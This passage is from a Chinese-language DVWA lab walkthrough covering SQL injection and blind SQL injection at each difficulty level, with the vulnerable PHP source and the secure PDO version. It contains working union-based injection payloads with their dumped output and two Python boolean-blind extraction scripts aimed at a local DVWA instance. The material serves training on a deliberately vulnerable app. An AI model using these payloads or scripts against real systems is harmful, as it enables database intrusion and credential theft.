class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。</p><h1 id="SQL-Injection（SQL注入）"><a href="#SQL-Injection（SQL注入）" class="headerlink" title="SQL Injection（SQL注入）"></a>SQL Injection（SQL注入）</h1><h2 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h2><p>SQL注入是可在生命中的了，不多说了，直接看代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一句直接拼接和SQL语句，导致注入，有回显，手工注入或者借用sqlmap就可以</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and 1&#x3D;2 order by 2#&#x2F;&#x2F;2列</span><br><span class="line"></span><br><span class="line">1&#39; and 1&#x3D;2 union select 1,2#</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查数据库和用户名</span><br><span class="line">1&#39; and 1&#x3D;2 union select user(),database()#</span><br><span class="line">root@localhost</span><br><span class="line">dvwa</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查表名</span><br><span class="line">1&#39; and 1&#x3D;2 union select group_concat(TABLE_NAME),2 from information_schema.TABLES where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">guestbook,users</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查列名</span><br><span class="line">1&#39; and 1&#x3D;2 union select group_concat(column_name),2 from information_schema.COLUMNS where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39;#</span><br><span class="line">user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查数据，admin的密码md5</span><br><span class="line">1&#39; and 1&#x3D;2 union select 1,password from users where user&#x3D;&#39;admin&#39;#</span><br><span class="line">5f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure><blockquote><p>过程中碰到一个错误：</p><p>Illegal mix of collations for operation ‘UNION’</p><p>说是字符集的错误，详情和解决方法见这两个链接：</p><p><a href="https://www.cnblogs.com/hongthink/p/6225468.html">https://www.cnblogs.com/hongthink/p/6225468.html</a></p><p><a href="http://www.111com.net/database/mysql/56096.htm">http://www.111com.net/database/mysql/56096.htm</a></p></blockquote><h2 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    $id = mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $id);</span><br><span class="line"></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Medium级别的代码利用<code>mysql_real_escape_string</code>函数对特殊符号<code>\x00,\n,\r,\,&#39;,&quot;,\x1a</code>进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p><p>我们可以通过burpsuite接收并控制id</p><p>由于单引号被转义，所以之前的payload会出错，尽量避免使用<code>&#39;</code>，也可以通过hex，16进制的形式，将必须的字符串做转换，从而绕过<code>mysql_real_escape_string</code>函数。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 order by 2# </span><br><span class="line">1 union select 1,2#</span><br><span class="line">1 union select 1,database()#</span><br><span class="line">查表</span><br><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line">f14g15here,guestbook,users</span><br><span class="line"></span><br><span class="line">查列（用16进制绕过指定表名所需的&#39;）</span><br><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0×7573657273 #</span><br><span class="line">user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class="line"></span><br><span class="line">查数据</span><br><span class="line">1 union select 1,password from users where user&#x3D;0x61646d696e</span><br><span class="line">d78b6f30225cdc811adfe8d4e7c9fd34</span><br></pre></td></tr></table></figure><h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><p>与Medium相比，多了<code>LIMIT 1</code> 想通过这种方式限制输出。然后用SESSION_ID 的方式，但实际上与Low级别的防护一样差。。。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39; LIMIT 1;&quot;;</span><br></pre></td></tr></table></figure><p>至于payload，Low级别的都可以用。。。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line">Surname: f14g15here,guestbook,users</span><br><span class="line"></span><br><span class="line">1&#39; and 1&#x3D;2 union select 1,group_concat(column_name) from information_schema.COLUMNS where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39;#</span><br><span class="line">user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br></pre></td></tr></table></figure><h2 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p><h1 id="SQL-Blind-Injection（SQL盲注）"><a href="#SQL-Blind-Injection（SQL盲注）" class="headerlink" title="SQL Blind Injection（SQL盲注）"></a>SQL Blind Injection（SQL盲注）</h1><h2 id="Low-7"><a href="#Low-7" class="headerlink" title="Low"></a>Low</h2><p>盲注，没有数据的回显，只显示<code>userid</code>在数据库或者不在数据库中。没有任何过滤。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p>因为存在明显的两种条件表示是非，可以通过布尔盲注来注入得到数据。为了更贴近CTF，我增加了一条flag的表，作为测试。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line">import requests</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">dic = <span class="keyword">string</span>.printable[:<span class="number">94</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 注入点url</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.220.1/dvwa/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">TrueState = <span class="string">&#x27;exists&#x27;</span></span><br><span class="line">FlaseState = <span class="string">&#x27;MISSING&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;security&#x27;</span>:<span class="string">&#x27;low&#x27;</span>,<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;igtb1sfu1lm1gb9e4ug06i0d1e&#x27;</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.爆库名的长度</span></span><br><span class="line">def dbnameLength():</span><br><span class="line">    <span class="keyword">for</span> DBlen in range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        PayloadofDBlen = <span class="string">&quot;?id=1&#x27; and length(database())=&#123;&#125;%23&amp;Submit=Submit&quot;</span>.format(DBlen)</span><br><span class="line">        DBlen_url = url + PayloadofDBlen</span><br><span class="line">        response = s.get(DBlen_url,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> TrueState in response:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;DBnamelen is &quot;</span>, DBlen)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库名</span></span><br><span class="line">def dbname():</span><br><span class="line">    DBlen = <span class="number">4</span></span><br><span class="line">    DBname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>, DBlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c in dic:</span><br><span class="line">            DBnamePayload = <span class="string">&quot;?id=1&#x27; and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; %23&amp;Submit=Submit&quot;</span>.format(i,str(c))</span><br><span class="line">            DBname_url = url + DBnamePayload</span><br><span class="line">            <span class="keyword">print</span>(DBnamePayload)</span><br><span class="line">            response = s.get(DBname_url,cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState in response:</span><br><span class="line">                DBname += c</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;DBname is:&quot;</span>, DBname)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出所有的表名</span></span><br><span class="line">def tableName():</span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c in dic:</span><br><span class="line">            tableName_payload = <span class="string">&quot;?id=1&#x27; and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; %23&amp;Submit=Submit#&quot;</span>.format(str(i),str(c))</span><br><span class="line">            tableName_url = url + tableName_payload</span><br><span class="line">            <span class="comment"># print(tableName_url)</span></span><br><span class="line">            response = s.get(tableName_url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState in response:</span><br><span class="line">                table_name += c</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&#x27;table_name:&#x27;</span>,table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出指定表的所有列名</span></span><br><span class="line">def ColumnName(tablename):</span><br><span class="line">    column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c in dic:</span><br><span class="line">            columnName_payload = <span class="string">&quot;?id=1&#x27; and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;&#123;&#125;&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; %23&amp;Submit=Submit#&quot;</span>.format(tablename,str(i),str(c))</span><br><span class="line">            columnName_url = url + columnName_payload</span><br><span class="line">            <span class="comment"># print(tableName_url)</span></span><br><span class="line">            response = s.get(columnName_url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState in response:</span><br><span class="line">                column_name += c</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;column_name of TABLE &#123;&#125;:&#123;&#125;&quot;</span>.format(tablename,column_name))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.爆出指定表指定列的数据</span></span><br><span class="line">def flag(columname, tablename):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c in dic:</span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and substr((select &#123;&#125; from &#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;%23&amp;Submit=Submit#&quot;</span>.format(columname,tablename,i,str(c))</span><br><span class="line">            flag_url = url + payload</span><br><span class="line">            response = s.get(flag_url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState in response:</span><br><span class="line">                flag += c</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;flag is&quot;</span>,flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># dbnameLength()</span></span><br><span class="line">    <span class="comment"># dbname()</span></span><br><span class="line">    <span class="comment"># tableNum()</span></span><br><span class="line">    tableName()</span><br><span class="line">    <span class="comment"># table_name: f14g15here,guestbook,users</span></span><br><span class="line">    <span class="comment"># ColumnName(&#x27;f14g15here&#x27;)</span></span><br><span class="line">    <span class="comment"># column_name of TABLE f14g15here:f1ag</span></span><br><span class="line">    <span class="comment"># flag(&#x27;f1ag&#x27;,&#x27;f14g15here&#x27;)</span></span><br><span class="line">    <span class="comment"># flag is flag&#123;this_is_a_test_flag&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h2><p>主要将<code>id</code>换成数字型注入，然后通过POST方法上传数据，通过下拉表单的方式试图避免id可控，但是通过写脚本和burp，id是可控的。还通过<code>mysqli_real_escape_string</code>转义单引号<code>’</code>。</p><p>可以通过16进制绕过必要的字符或者ascii码来判断</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and ascii(substr(database(),1,1))&#x3D;100 %23</span><br><span class="line">id&#x3D;1 and ascii(substr(database(),1,1))&#x3D;0x64 %23</span><br></pre></td></tr></table></figure><p>直接放一下脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.printable[:<span class="number">94</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 注入点url</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/dvwa/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">TrueState = <span class="string">&#x27;exists&#x27;</span></span><br><span class="line">FlaseState = <span class="string">&#x27;MISSING&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;security&#x27;</span>:<span class="string">&#x27;medium&#x27;</span>,<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;51ca1k3krm3iqvo0tsfhjiu8lu&#x27;</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.爆库名的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbnameLength</span>():</span></span><br><span class="line">    <span class="keyword">for</span> DBlen <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        PayloadofDBlen = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;1 and length(database())=&#123;&#125;%23&quot;</span>.format(DBlen), <span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">        response = s.post(url,cookies=cookies,data=PayloadofDBlen).text</span><br><span class="line">        <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">            print(<span class="string">&quot;DBnamelen is &quot;</span>, DBlen)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbname</span>():</span></span><br><span class="line">    DBlen = <span class="number">4</span></span><br><span class="line">    DBname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, DBlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            DBnamePayload = &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&quot;1 and ascii(substr(database(),&#123;&#125;,1))=&#123;&#125; #&quot;</span>.format(i,ord(c)),<span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">            <span class="comment"># DBname_url = url + DBnamePayload</span></span><br><span class="line">            <span class="comment"># print(DBnamePayload)</span></span><br><span class="line">            response = s.post(url,cookies=cookies,data=DBnamePayload).text</span><br><span class="line">            <span class="comment"># print(response)</span></span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                DBname += c</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;DBname is:&quot;</span>, DBname)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出所有的表名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tableName</span>():</span></span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            tableName_payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125; #&quot;</span>.format(str(i),ord(c)),<span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">            <span class="comment"># tableName_url = url + tableName_payload</span></span><br><span class="line">            <span class="comment"># print(tableName_url)</span></span><br><span class="line">            response = s.post(url, cookies=cookies, data=tableName_payload).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                table_name += c</span><br><span class="line">                print(<span class="string">&#x27;table_name:&#x27;</span>,table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出指定表的所有列名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ColumnName</span>(<span class="params">tablename</span>):</span></span><br><span class="line">    column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            columnName_payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#123;&#125;),&#123;&#125;,1))=&#123;&#125; #&quot;</span>.format(tablename,str(i),ord(c)),<span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">            <span class="comment"># columnName_url = url + columnName_payload</span></span><br><span class="line">            <span class="comment"># print(tableName_url)</span></span><br><span class="line">            response = s.post(url, cookies=cookies, data=columnName_payload).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                column_name += c</span><br><span class="line">                print(<span class="string">&quot;column_name of TABLE &#123;&#125;:&#123;&#125;&quot;</span>.format(tablename,column_name))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>(<span class="params">columname, tablename</span>):</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            payload = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;1 and ascii(substr((select &#123;&#125; from &#123;&#125;),&#123;&#125;,1))=&#123;&#125;#&quot;</span>.format(columname,tablename,i,ord(c)),<span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">            <span class="comment"># flag_url = url + payload</span></span><br><span class="line">            response = s.post(url, cookies=cookies, data=payload).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                flag += c</span><br><span class="line">                print(<span class="string">&quot;flag is&quot;</span>,flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># dbnameLength()</span></span><br><span class="line">    <span class="comment"># dbname()</span></span><br><span class="line">    <span class="comment"># tableName()</span></span><br><span class="line">    <span class="comment"># table_name: f14g15here,guestbook,users</span></span><br><span class="line">    <span class="comment"># ColumnName(&#x27;0x66313467313568657265&#x27;)</span></span><br><span class="line">    <span 